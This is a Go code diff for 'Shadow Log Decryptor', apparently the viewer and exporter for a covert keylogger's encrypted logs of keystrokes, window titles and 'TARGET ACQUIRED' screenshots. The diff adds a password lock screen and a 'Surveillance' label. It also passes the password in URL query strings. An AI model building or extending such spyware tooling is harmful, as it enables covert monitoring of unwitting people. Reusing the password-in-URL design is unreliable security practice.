@@ -37,6 +37,9 @@ func main() {
 	// This version uses a web-based UI for a premium, non-terminal experience.
 
 	logPath := config.GetStoragePath()
+	
+	// CRITICAL FIX: We must call LoadConfig so it reads the AES password from the log header.
+	config.LoadConfig()
 
 	// Start local server for the UI.
 	mux := http.NewServeMux()
@@ -65,6 +68,27 @@ func main() {
 	})
 
 	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		pwd := r.URL.Query().Get("pwd")
+		errorMsg := ""
+
+		if pwd != "" {
+			config.SetEncryptionPassword(pwd)
+			_, err := config.LoadConfig()
+			if err != nil {
+				errorMsg = "Invalid decryption password. Please try again."
+				pwd = "" // Reset to show lock screen
+			}
+		}
+
+		// If no valid password was accepted/provided, show the Lock screen.
+		if pwd == "" {
+			tmpl := template.Must(template.New("lock").Parse(lockHtmlContent))
+			tmpl.Execute(w, map[string]interface{}{
+				"Error": errorMsg,
+			})
+			return
+		}
+
 		entries := loadLogs(logPath)
 		tmpl := template.Must(template.New("decryptor").Funcs(template.FuncMap{
 			"split": func(s, sep string) []string {
@@ -90,6 +114,18 @@ func main() {
 
 	// Handle data export (JSON)
 	mux.HandleFunc("/export", func(w http.ResponseWriter, r *http.Request) {
+		pwd := r.URL.Query().Get("pwd")
+		if pwd == "" {
+			http.Error(w, "Unauthorized", http.StatusUnauthorized)
+			return
+		}
+		
+		config.SetEncryptionPassword(pwd)
+		if _, err := config.LoadConfig(); err != nil {
+			http.Error(w, "Invalid password", http.StatusForbidden)
+			return
+		}
+
 		entries := loadLogs(logPath)
 		w.Header().Set("Content-Type", "application/json")
 		w.Header().Set("Content-Disposition", "attachment; filename=shadowlog_export.json")
@@ -155,10 +191,15 @@ func loadLogs(path string) []LogEntry {
 				remaining := rawLine[22:]
 				if idx := strings.Index(remaining, "] "); idx != -1 && remaining[0] == '[' {
 					entry.Window = remaining[1:idx]
-					// CRITICAL FIX: Strip the metadata from the Key column entirely.
 					entry.Key = remaining[idx+2:]
 				}
 			}
+			
+			// Detect TARGET ACQUISITION (Screenshots)
+			if strings.Contains(entry.Key, "📸 TARGET ACQUIRED") {
+				entry.Window = "Surveillance"
+			}
+
 			rawEntries = append(rawEntries, entry)
 		}
 	}
@@ -211,6 +252,126 @@ func openBrowser(url string) {
 	}
 }
 
+const lockHtmlContent = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Locked | Shadow Log</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #0078d4;
+            --bg: #050505;
+            --card-bg: rgba(20, 20, 20, 0.4);
+            --card-border: rgba(255, 255, 255, 0.1);
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: white;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            margin: 0;
+        }
+        .mesh {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-image: 
+                radial-gradient(at 0% 0%, rgba(0, 120, 212, 0.15) 0px, transparent 50%),
+                radial-gradient(at 100% 100%, rgba(0, 120, 212, 0.05) 0px, transparent 50%);
+            z-index: -1;
+        }
+        .lock-card {
+            background: var(--card-bg);
+            backdrop-filter: blur(40px);
+            border: 1px solid var(--card-border);
+            padding: 64px 48px;
+            border-radius: 32px;
+            width: 100%;
+            max-width: 440px;
+            text-align: center;
+            box-shadow: 0 40px 80px -20px rgba(0,0,0,0.5);
+            animation: float 6s ease-in-out infinite;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        .icon-box {
+            width: 80px; height: 80px;
+            background: rgba(0, 120, 212, 0.1);
+            border: 1px solid var(--card-border);
+            border-radius: 20px;
+            margin: 0 auto 32px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: var(--primary);
+        }
+        h1 { font-size: 1.75rem; font-weight: 800; margin-bottom: 8px; letter-spacing: -0.04em; }
+        p { color: rgba(255,255,255,0.5); font-size: 0.9375rem; margin-bottom: 32px; font-weight: 500; }
+        .input-group { position: relative; margin-bottom: 16px; }
+        input {
+            width: 100%;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid var(--card-border);
+            border-radius: 16px;
+            padding: 18px 24px;
+            color: white;
+            font-size: 1rem;
+            outline: none;
+            transition: all 0.3s;
+            box-sizing: border-box;
+        }
+        input:focus { border-color: var(--primary); background: rgba(255,255,255,0.08); box-shadow: 0 0 0 4px rgba(0, 120, 212, 0.1); }
+        .btn-unlock {
+            width: 100%;
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 16px;
+            font-weight: 800;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 8px;
+        }
+        .btn-unlock:hover { transform: translateY(-2px); filter: brightness(1.1); box-shadow: 0 10px 20px -5px rgba(0, 120, 212, 0.4); }
+        .error { color: #ff4d4d; font-size: 0.8125rem; margin-top: 12px; font-weight: 600; }
+    </style>
+</head>
+<body>
+    <div class="mesh"></div>
+    <div class="lock-card">
+        <div class="icon-box">
+            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+        </div>
+        <h1>Decrypt Evidence</h1>
+        <p>ShadowLog forensics module is active. Enter your encryption password to proceed.</p>
+        <div class="input-group">
+            <input type="password" id="pwdInput" placeholder="Encryption Password" onkeyup="if(event.key==='Enter') unlock()">
+        </div>
+        <button class="btn-unlock" onclick="unlock()">Unlock Session</button>
+        {{ if .Error }}<div class="error">{{ .Error }}</div>{{ end }}
+    </div>
+    <script>
+        function unlock() {
+            const pwd = document.getElementById('pwdInput').value;
+            if (pwd) {
+                window.location.href = '/?pwd=' + encodeURIComponent(pwd);
+            }
+        }
+    </script>
+</body>
+</html>
+`
+
 const htmlContent = `
 <!DOCTYPE html>
 <html lang="en">
@@ -244,7 +405,7 @@ const htmlContent = `
             line-height: 1.6;
         }
 
-        .container { max-width: 1200px; margin: 0 auto; }
+        .container { max-width: 1600px; width: 95%; margin: 0 auto; }
         
         .header {
             display: flex;
@@ -287,7 +448,7 @@ const htmlContent = `
 
         .search-box {
             position: relative;
-            max-width: 600px;
+            width: 100%;
         }
         .search-box input {
             width: 100%;
@@ -404,6 +565,12 @@ const htmlContent = `
             color: var(--accent);
         }
 
+        .location-badge.surveillance {
+            background: rgba(46, 204, 113, 0.1);
+            border-color: rgba(46, 204, 113, 0.2);
+            color: #2ecc71;
+        }
+
         .win-title {
             font-size: 0.8125rem;
             color: var(--text-dim);
@@ -463,7 +630,7 @@ const htmlContent = `
         <div class="header">
             <div class="logo-box">
                 <div class="icon">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M17.5 19c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.8 0-.3-.1-.5-.3-.7-.2-.2-.5-.3-.8-.3-.3 0-.5.1-.7.3-.2.2-.3.5-.3.8 0 .3.1.5.3.7.2.2.5.3.8.3zM15 9.5c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.7 0-.3-.1-.5-.3-.7-.2-.2-.5-.3-.7-.3-.3 0-.5.1-.7.3-.2.2-.3.5-.3.7 0 .3.1.5.3.7.2.2.5.3.7.3zM11 19c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.8 0-.3-.1-.5-.3-.7-.2-.2-.5-.3-.8-.3-.3 0-.5.1-.7.3-.2.2-.3.5-.3.8 0 .3.1.5.3.7.2.2.5.3.8.3zM6.5 15.5c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.8 0-.3-.1-.5-.3-.7-.2-.2-.5-.3-.8-.3-.3 0-.5.1-.7.3-.2.2-.3.5-.3.8 0 .3.1.5.3.7.2.2.5.3.8.3zM21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6-8 10-8 10z"></path></svg>
                 </div>
                 <div>
                     <h1>Shadow Log Decryptor</h1>
@@ -475,7 +642,7 @@ const htmlContent = `
                 </div>
             </div>
             <div style="display: flex; gap: 16px;">
-                <a href="/export" class="btn">
+                <a href="#" id="exportBtn" class="btn">
                     <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
                     Export Artifacts
                 </a>
@@ -486,7 +653,7 @@ const htmlContent = `
             </div>
         </div>
 
-        <div class="controls">
+        <div class="controls" style="display: flex; gap: 16px;">
             <div class="search-box">
                 <svg class="search-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
                 <input type="text" id="searchInput" placeholder="Filter by window title or artifact content..." onkeyup="filterLogs()">
@@ -499,16 +666,19 @@ const htmlContent = `
             <div class="log-row">
                 <div class="meta-col">
                     <span class="ts">{{ .Timestamp }}</span>
-                    <div class="location-badge {{ if eq .Window "System" }}system{{ end }}">
+                    <div class="location-badge {{ if eq .Window "System" }}system{{ else if eq .Window "Surveillance" }}surveillance{{ end }}">
                         {{ if eq .Window "System" }}
                         <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                         CORE SYSTEM
+                        {{ else if eq .Window "Surveillance" }}
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>
+                        ACQUISITION
                         {{ else }}
                         <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
                         {{ if index (split .Window " - ") 0 }}{{ index (split .Window " - ") 0 }}{{ else }}Background Process{{ end }}
                         {{ end }}
                     </div>
-                    {{ if ne .Window "System" }}
+                    {{ if and (ne .Window "System") (ne .Window "Surveillance") }}
                     <span class="win-title" title="{{ .Window }}">
                         {{ if index (split .Window " - ") 1 }}{{ index (split .Window " - ") 1 }}{{ else }}{{ .Window }}{{ end }}
                     </span>
@@ -539,6 +709,13 @@ const htmlContent = `
             }
         }, 2000);
 
+        // Update export link with current password
+        const urlParams = new URLSearchParams(window.location.search);
+        const pwd = urlParams.get('pwd');
+        if (pwd) {
+            document.getElementById('exportBtn').href = '/export?pwd=' + encodeURIComponent(pwd);
+        }
+
         function filterLogs() {
             const input = document.getElementById('searchInput');
             const filter = input.value.toUpperCase();
@@ -550,7 +727,7 @@ const htmlContent = `
                 const key = rows[i].getElementsByClassName('key-data')[0];
                 
                 const badgeText = badge ? badge.textContent : "";
-                const titleText = title ? title.textContent : "";
+                const titleText = title ? title.textContent : (badgeText.includes("ACQUISITION") ? "ACQUISITION" : "");
                 const keyText = key ? key.textContent : "";
                 
                 const txtValue = badgeText + " " + titleText + " " + keyText;
